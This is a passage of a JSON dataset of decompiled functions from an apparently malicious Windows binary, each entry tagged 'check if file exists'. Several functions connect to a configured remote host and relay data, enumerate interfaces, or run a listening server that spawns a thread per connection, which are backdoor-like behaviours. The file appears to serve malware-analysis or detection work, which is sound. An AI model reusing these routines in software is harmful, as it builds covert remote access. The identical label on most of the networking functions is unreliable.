            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0046f744(void)\n\n{\n    uint in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar2 = 0x16;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x46fd1f;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046f744::var_20h;\n    var_14h = in_EAX;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    fcn.004216c4();\n    var_18h = fcn.00404620();\n    piVar1 = fcn.00404620();\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00421ea0();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        var_1ch = 0;\n        do {\n            iVar2 = var_38h;\n            (**(*var_18h + 0xc))(var_4h);\n            (**(*var_18h + 0xc))(0x46fd70, var_34h);\n            fcn.00422068();\n            fcn.0040a68c();\n            var_34h = 0x46fd70;\n            var_38h = 0x46f827;\n            (**(*var_18h + 0xc))();\n            var_8h = 0x46f834;\n            fcn.00422068();\n            var_8h = var_44h;\n            var_ch = 0x46fd70;\n            var_10h = 0x46fd7c;\n            var_14h = 0x46fd38;\n            var_18h = 0x46fd70;\n            var_1ch = 0x46fd8c;\n            var_20h = 0x46fd98;\n            fcn.004058e0();\n            var_1ch = var_1ch + 1;\n        } while (iVar2 != 1);\n    }\n    fcn.00421770();\n    (**(*var_18h + 0x44))();\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00421ea0();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        var_1ch = 0;\n        do {\n            (**(*var_18h + 0xc))(var_8h);\n            (**(*var_18h + 0xc))(0x46fd70, var_4ch);\n            fcn.00422068();\n            fcn.0040a68c();\n            (**(*var_18h + 0xc))(0x46fd70);\n            var_8h = 0x46f91f;\n            fcn.00422068();\n            var_8h = var_5ch;\n            var_ch = 0x46fd70;\n            var_10h = 0x46fda4;\n            var_14h = 0x46fd38;\n            var_18h = 0x46fd70;\n            var_1ch = 0x46fd8c;\n            var_20h = 0x46fd98;\n            fcn.004058e0();\n            var_1ch = var_1ch + 1;\n        } while (var_50h != 1);\n    }\n    fcn.00421770();\n    (**(*var_18h + 0x44))();\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00421dd8();\n    var_30h = (**(*var_18h + 0x14))();\n    if (-1 < var_30h + -1) {\n        var_1ch = 0;\n        do {\n            fcn.00421770();\n            (**(*var_18h + 0xc))();\n            fcn.00405864();\n            fcn.004218e4();\n            fcn.00421ea0();\n            var_20h = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            iVar2 = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            if ((var_20h != -1) && (iVar2 != -1)) {\n                (**(*var_18h + 0xc))(var_ch);\n                (**(*piVar1 + 0xc))(0x46fd70, var_6ch);\n                fcn.00422068();\n                var_30h = var_70h;\n                (**(*piVar1 + 0xc))(0x46fd70);\n                fcn.00422068();\n                (**(*piVar1 + 0xc))(0x46fd70, var_78h);\n                fcn.00422068();\n                (**(*piVar1 + 0xc))(0x46fe6c, var_80h);\n                var_14h = 0x46fae4;\n                fcn.00422068();\n                var_14h = var_88h;\n                var_18h = 0x46fd70;\n                var_1ch = 0x46fe78;\n                var_20h = 0x46fd98;\n                fcn.004058e0();\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    fcn.00421770();\n    (**(*var_18h + 0x44))();\n    (**(*piVar1 + 0x44))();\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00421dd8();\n    var_30h = (**(*var_18h + 0x14))();\n    if (-1 < var_30h + -1) {\n        var_1ch = 0;\n        do {\n            fcn.00421770();\n            (**(*var_18h + 0xc))();\n            fcn.00405864();\n            fcn.004218e4();\n            fcn.00421ea0();\n            var_20h = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            iVar2 = (**(*piVar1 + 0x54))();\n            if ((var_20h != -1) && (iVar2 != -1)) {\n                (**(*var_18h + 0xc))(var_10h);\n                (**(*piVar1 + 0xc))(0x46fd70, var_98h);\n                fcn.00422068();\n                var_30h = var_9ch;\n                (**(*piVar1 + 0xc))(0x46fd70);\n                fcn.00422068();\n                (**(*piVar1 + 0xc))(0x46fd70, var_a4h);\n                var_14h = 0x46fc97;\n                fcn.00422068();\n                var_14h = var_ach;\n                var_18h = 0x46fd70;\n                var_1ch = 0x46fe78;\n                var_20h = 0x46fd98;\n                fcn.004058e0();\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    iVar2 = var_10h;\n    fcn.004058e0(var_10h, var_ch, var_8h, var_4h);\n    fcn.00404650();\n    fcn.00404650();\n    fcn.00404650();\n    *in_FS_OFFSET = iVar2;\n    fcn.00405554(0x46fd26);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2391
    },
    "00473208": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00473208(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffff954;\n    int32_t iStack1680;\n    uint uStack1676;\n    uchar *puStack1672;\n    uint uStack1668;\n    uint uStack1664;\n    uint uStack1660;\n    int32_t iStack1656;\n    uint uStack1652;\n    uchar *puStack1648;\n    uint var_65ch;\n    uint var_658h;\n    uint var_654h;\n    uint var_1ch;\n    int32_t in;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s;\n    \n    puStack1648 = &stack0xfffffffc;\n    uStack1652 = 0x473339;\n    iStack1656 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff988;\n    uStack1660 = 0x473235;\n    fcn.00405530();\n    uStack1660 = 0;\n    uStack1664 = 1;\n    uStack1668 = 2;\n    puStack1672 = 0x473240;\n    iVar1 = sub.wsock32.dll_socket();\n    s = iVar1;\n    if (iVar1 != -1) {\n        uStack1676 = 0x47330b;\n        iStack1680 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff970;\n        puStack1672 = &stack0xfffffffc;\n        iVar2 = sub.WS2_32.DLL_WSAIoctl\n                          (iVar1, 0x4004747f, 0, 0, &fcn.00473208::var_658h, 0x400, &fcn.00473208::var_8h, 0, 0);\n        if ((iVar2 != -1) && (-1 < var_8h / 0x4c + -1)) {\n            var_ch = var_8h / 0x4c;\n            puVar3 = &fcn.00473208::var_654h;\n            do {\n                var_1ch = *puVar3;\n                in = puVar3[1];\n                uStack24 = puVar3[2];\n                uStack20 = puVar3[3];\n                sub.wsock32.dll_inet_ntoa(puVar3[1]);\n                fcn.00405728();\n                fcn.00405818();\n                var_1ch = puVar3[0xc];\n                in = puVar3[0xd];\n                uStack24 = puVar3[0xe];\n                uStack20 = puVar3[0xf];\n                var_1ch = puVar3[6];\n                iVar1 = puVar3[7];\n                in = iVar1;\n                uStack24 = puVar3[8];\n                uStack20 = puVar3[9];\n                sub.wsock32.dll_inet_ntoa(in_EAX);\n                fcn.00405818();\n                puVar3 = puVar3 + 0x13;\n                var_ch = var_ch + -1;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = iVar1;\n        in_stack_fffff954 = s;\n        sub.wsock32.dll_closesocket();\n    }\n    *in_FS_OFFSET = in_stack_fffff954;\n    fcn.00405530(0x473340);\n    return;\n}\n",
        "token_count": 804
    },
    "00473d08": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00473d08(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY100;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint lpNumberOfBytesRead;\n    uint *lpBuffer;\n    uint var_4h;\n    \n    puStack32 = 0x473d1f;\n    lpBuffer = param_2;\n    fcn.004059cc();\n    uStack36 = 0x473daa;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(0x80000000, 1, 0, 3, 0, 0);\n    iVar2 = sub.kernel32.dll_CreateFileA_1(uVar1);\n    if (iVar2 != -1) {\n        uVar1 = sub.kernel32.dll_GetFileSize_1(iVar2, 0);\n        fcn.00406928(uVar1);\n        sub.kernel32.dll_ReadFile_1(iVar2, *lpBuffer, uVar1, &fcn.00473d08::lpNumberOfBytesRead, 0);\n        sub.kernel32.dll_CloseHandle_1();\n        iStackY100 = iVar2;\n    }\n    *in_FS_OFFSET = iStackY100;\n    fcn.00405530(0x473db1);\n    return;\n}\n",
        "token_count": 349
    },
    "004807d8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004807d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != -1) {\n        *(in_EAX + 0x44) = param_2;\n        return;\n    }\n    *(in_EAX + 0x48) = 0xffffffff;\n    return;\n}\n",
        "token_count": 85
    },
    "00480cf4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00480cf4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != -1) {\n        *(in_EAX + 0x44) = param_2;\n        return;\n    }\n    *(in_EAX + 0x48) = 0xffffffff;\n    return;\n}\n",
        "token_count": 85
    },
    "00480fec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00480fec(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar auStack372 [8];\n    uint uStack364;\n    uint uStack360;\n    uint *puStack356;\n    uint uStack352;\n    uint uStack348;\n    uchar *puStack344;\n    uint var_150h;\n    uint var_134h;\n    uint var_130h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack344 = 0x481000;\n    fcn.004059cc();\n    uStack348 = 0x48109e;\n    uStack352 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffea0;\n    puStack356 = &fcn.00480fec::var_150h;\n    uStack360 = 0x48101d;\n    puStack344 = &stack0xfffffffc;\n    uStack360 = fcn.004059dc();\n    uStack364 = 0x481023;\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1();\n    if (iVar2 == -1) {\n        var_10h = 0;\n        var_ch = 0;\n        *in_FS_OFFSET = uStack360;\n        uStack352 = 0x4810a5;\n        puStack356 = 0x48109d;\n        fcn.00405530();\n        return;\n    }\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe8c;\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 362
    },
    "00482630": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00482630 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    var_420h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack1080 = 0x4827a8;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    fcn.00405728();\n    fcn.00405b28(&var_420h);\n    fcn.00405a44();\n    uVar1 = fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    uVar2 = fcn.00409edc();\n    fcn.00482554();\n    iVar3 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar3 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00403af4();\n    var_1ch._0_2_ = 2;\n    var_18h = sub.wsock32.dll_inet_addr(uVar1);\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    if (var_18h == -1) {\n        iVar4 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar4 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_18h = ***(iVar4 + 0xc);\n    }\n    iVar4 = sub.wsock32.dll_connect(iVar3, &var_1ch, 0x10);\n    if (iVar4 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.004824b0();\n    sub.wsock32.dll_recv(iVar3, &var_41ch, 0x400, 0);\n    fcn.00405728();\n    sub.kernel32.dll_Sleep_2(1000);\n    sub.wsock32.dll_closesocket(iVar3);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 650
    },
    "0048298c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0048298c noreturn (int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack56 = 0x4829b1;\n    fcn.00405fe8();\n    uStack60 = 0x482b03;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    uStack72 = 0x482ac1;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack56 = &stack0xfffffffc;\n    fcn.00408560();\n    fcn.004055c8();\n    uVar2 = *(arg_8h + 4);\n    fcn.00403af4();\n    iVar1 = sub.wsock32.dll_socket(2, 1, 0);\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    var_1ch._0_2_ = 2;\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    uVar2 = fcn.004059dc();\n    var_18h = sub.wsock32.dll_inet_addr(uVar2);\n    if (var_18h == -1) {\n        uVar2 = fcn.004059dc();\n        iVar3 = sub.wsock32.dll_gethostbyname(uVar2);\n        if (iVar3 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_18h = ***(iVar3 + 0xc);\n    }\n    iVar3 = sub.wsock32.dll_connect(iVar1, &fcn.0048298c::var_1ch, 0x10);\n    if (iVar3 == 0) {\n        fcn.00409d70(0x482b30, var_4h, 0x482b1c);\n        fcn.004058e0(0);\n        fcn.00475e2c();\n        sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 683
    },
    "0048317c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0048317c noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack1132;\n    uint uStack1128;\n    uchar *puStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint var_444h;\n    uint var_440h;\n    uint var_43ch;\n    int32_t var_438h;\n    uint var_42ch;\n    int32_t *var_2ch;\n    int32_t var_28h;\n    uint var_20h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1124 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack1112 = 0x4831b0;\n    fcn.00405fe8();\n    uStack1116 = 0x48340f;\n    uStack1120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffba0;\n    uStack1128 = 0x4833a9;\n    uStack1132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffb94;\n    puStack1112 = &stack0xfffffffc;\n    var_2ch = fcn.0041c07c();\n    fcn.00408560();\n    fcn.004055c8();\n    fcn.004055c8();\n    fcn.004055c8();\n    fcn.004613d8();\n    fcn.004055c8();\n    fcn.0041c198();\n    var_28h = sub.wsock32.dll_socket(2, 1, 0);\n    if (var_28h == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    var_43ch._0_2_ = 2;\n    var_43ch._2_2_ = sub.wsock32.dll_htons(**0x4949d4);\n    var_438h = sub.wsock32.dll_inet_addr(**0x494b30);\n    if (var_438h == -1) {\n        iVar1 = sub.wsock32.dll_gethostbyname(**0x494b30);\n        if (iVar1 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_438h = ***(iVar1 + 0xc);\n    }\n    sub.wsock32.dll_connect(var_28h, &fcn.0048317c::var_43ch, 0x10);\n    iVar1 = sub.wsock32.dll_recv(var_28h, &fcn.0048317c::var_42ch, 0x400, 0);\n    if (iVar1 != -1) {\n        fcn.004058e0(var_ch, 0x483440, var_8h, 0x48342c);\n        fcn.00475ecc();\n        uVar3 = 0x400;\n        iVar1 = sub.wsock32.dll_recv(var_28h, &fcn.0048317c::var_42ch, 0x400, 0);\n        if (iVar1 != -1) {\n            fcn.0041b734(0, 0);\n            while( true ) {\n                fcn.00403af4();\n                iVar1 = (**(*var_2ch + 0xc))();\n                if (iVar1 < 1) break;\n                iVar2 = sub.wsock32.dll_send(uVar3, &fcn.0048317c::var_42ch, iVar1, 0);\n                if (iVar2 == -1) break;\n                iVar2 = sub.wsock32.dll_recv(var_28h, &fcn.0048317c::var_42ch, 0x400, 0);\n                if ((iVar2 == -1) || (iVar1 < 1)) break;\n            }\n        }\n    }\n    sub.wsock32.dll_shutdown(var_28h, 2);\n    sub.wsock32.dll_closesocket(var_28h);\n    fcn.00404650();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 1004
    },
    "004836d8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004836d8 noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack1080;\n    uint uStack1076;\n    uchar *puStack1072;\n    uint var_41ch;\n    uint var_418h;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1072 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack1076 = 0x483817;\n    uStack1080 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1080;\n    fcn.00405728(0x483830);\n    fcn.004058e0(0x483854, 0, 0);\n    iVar1 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar1 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00403af4();\n    var_18h._0_2_ = 2;\n    var_14h = sub.wsock32.dll_inet_addr(arg_8h);\n    var_18h._2_2_ = sub.wsock32.dll_htons(0x50);\n    if (var_14h == -1) {\n        iVar2 = sub.wsock32.dll_gethostbyname(arg_8h);\n        if (iVar2 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_14h = ***(iVar2 + 0xc);\n    }\n    iVar2 = sub.wsock32.dll_connect(iVar1, &var_18h, 0x10);\n    if (iVar2 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00475f68();\n    sub.wsock32.dll_recv(iVar1, &var_418h, 0x400, 0);\n    fcn.00405728();\n    sub.kernel32.dll_Sleep_2(1000);\n    sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 570
    },
    "00485f40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00485f40(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint name;\n    int32_t var_ch;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x486072;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    *0x49c3a0 = sub.wsock32.dll_socket(2, 1, 0);\n    if (*0x49c3a0 != -1) {\n        name._0_2_ = 2;\n        name._2_2_ = sub.wsock32.dll_htons(**0x4949d4);\n        var_ch = sub.wsock32.dll_inet_addr(**0x494b30);\n        if (var_ch == -1) {\n            iStack76 = **0x494b30;\n            iVar1 = sub.wsock32.dll_gethostbyname();\n            if (iVar1 == 0) goto code_r0x00486057;\n            var_ch = ***(iVar1 + 0xc);\n        }\n        sub.wsock32.dll_connect(*0x49c3a0, &name, 0x10);\n        sub.wsock32.dll_recv(*0x49c3a0, 0x49a3a0, 0x1fff, 0);\n        fcn.00403af4();\n        fcn.00409d70();\n        fcn.00405864();\n        fcn.00475ecc();\n        iStack76 = *0x49c3a0;\n        sub.wsock32.dll_recv();\n        fcn.00403af4();\n    }\ncode_r0x00486057:\n    *in_FS_OFFSET = iStack76;\n    fcn.00405554(0x486079);\n    return;\n}\n",
        "token_count": 457
    },
    "00486e2c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00486e2c noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t *unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack124 = 0x486e63;\n    fcn.00405fe8();\n    uStack128 = 0x487046;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.00408560();\n    uVar1 = sub.wsock32.dll_socket(2, 1, 6);\n    fcn.00403af4();\n    var_30h._0_2_ = 2;\n    var_30h._2_2_ = sub.wsock32.dll_htons(var_10h & 0xffff);\n    var_2ch = 0;\n    iVar2 = sub.wsock32.dll_bind(uVar1, &fcn.00486e2c::var_30h, 0x10);\n    if (iVar2 == 0) {\n        iVar2 = sub.wsock32.dll_listen(uVar1, 5);\n        if (iVar2 == 0) {\n            uVar5 = 0;\n            uVar3 = var_10h;\n            fcn.00409e5c(var_10h);\n            fcn.00405864(uVar3, uVar5);\n            fcn.00487a30();\n            fcn.00409d70();\n            uVar4 = 0;\n            uVar5 = 0;\n            fcn.00409e5c(var_10h);\n            fcn.004870d4(uVar5, uVar4);\n            while( true ) {\n                var_20h = 0x10;\n                var_18h = sub.wsock32.dll_accept(uVar1, &fcn.00486e2c::var_40h, &fcn.00486e2c::var_20h);\n                if (var_18h == 0xffffffff) break;\n                unaff_EBX = sub.kernel32.dll_LocalAlloc_1(0x40, 0x10);\n                *unaff_EBX = var_10h;\n                fcn.00405584();\n                fcn.00405584();\n                unaff_EBX[3] = var_18h;\n                uVar5 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.00486918, unaff_EBX, 0, &fcn.00486e2c::var_1ch);\n                sub.kernel32.dll_CloseHandle_1(uVar5);\n                sub.kernel32.dll_Sleep_2();\n            }\n            uVar3 = *unaff_EBX;\n            uVar1 = 0;\n            fcn.00409e5c(uVar3);\n            fcn.00405864(uVar3, uVar1);\n            fcn.00487a30();\n            uVar3 = *unaff_EBX;\n            uVar1 = 0;\n            fcn.00409e5c(uVar3);\n            fcn.00487488(uVar3, uVar1);\n            goto code_r0x00487016;\n        }\n    }\n    uVar3 = *unaff_EBX;\n    uVar1 = 0;\n    fcn.00409e5c(uVar3);\n    fcn.00405864(uVar3, uVar1);\n    fcn.00487a30();\n    uVar3 = *unaff_EBX;\n    uVar1 = 0;\n    fcn.00409e5c(uVar3);\n    fcn.00487488(uVar3, uVar1);\ncode_r0x00487016:\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 1038
    },
    "00489244": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00489244 noreturn (void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_414h;\n    int32_t var_410h;\n    uint var_404h;\n    int32_t *var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    uStack1080 = 0x489441;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    var_4h = fcn.0041c07c();\n    fcn.004613d8();\n    fcn.00405584();\n    fcn.0041c198();\n    iVar1 = sub.wsock32.dll_socket(2, 1, 0);\n    if (iVar1 != -1) {\n        var_414h._0_2_ = 2;\n        var_414h._2_2_ = sub.wsock32.dll_htons(**0x4949d4);\n        var_410h = sub.wsock32.dll_inet_addr(**0x494b30);\n        if (var_410h == -1) {\n            iVar2 = sub.wsock32.dll_gethostbyname(**0x494b30);\n            if (iVar2 == 0) goto code_r0x00489406;\n            var_410h = ***(iVar2 + 0xc);\n        }\n        sub.wsock32.dll_connect(iVar1, &var_414h, 0x10);\n        uVar5 = 0;\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            uVar4 = 0x489458;\n            fcn.00409d70(0x48946c, *(in_EAX + 0x48), 0x489458);\n            fcn.004058e0(0);\n            fcn.00475ecc();\n            iVar2 = 